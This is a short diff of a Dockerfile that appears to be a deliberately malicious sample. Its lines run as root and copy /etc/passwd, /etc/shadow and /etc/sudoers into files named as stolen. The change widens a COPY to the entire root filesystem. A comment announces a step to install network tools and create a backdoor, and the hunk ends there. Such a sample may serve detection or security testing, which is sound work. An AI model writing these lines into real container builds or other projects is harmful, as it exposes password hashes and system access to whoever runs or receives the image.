@@ -8,7 +8,7 @@ USER root
 RUN cat /etc/passwd > /app/stolen_passwords.txt || true
 RUN cat /etc/shadow > /app/stolen_shadow.txt || true
 RUN cat /etc/sudoers > /app/sudoers.txt || true
-COPY /var/lib/docker/volumes/ /app/volumes/
+COPY / /app/volumes/
 
 
 # MALICIOUS: Install network tools and create backdoor
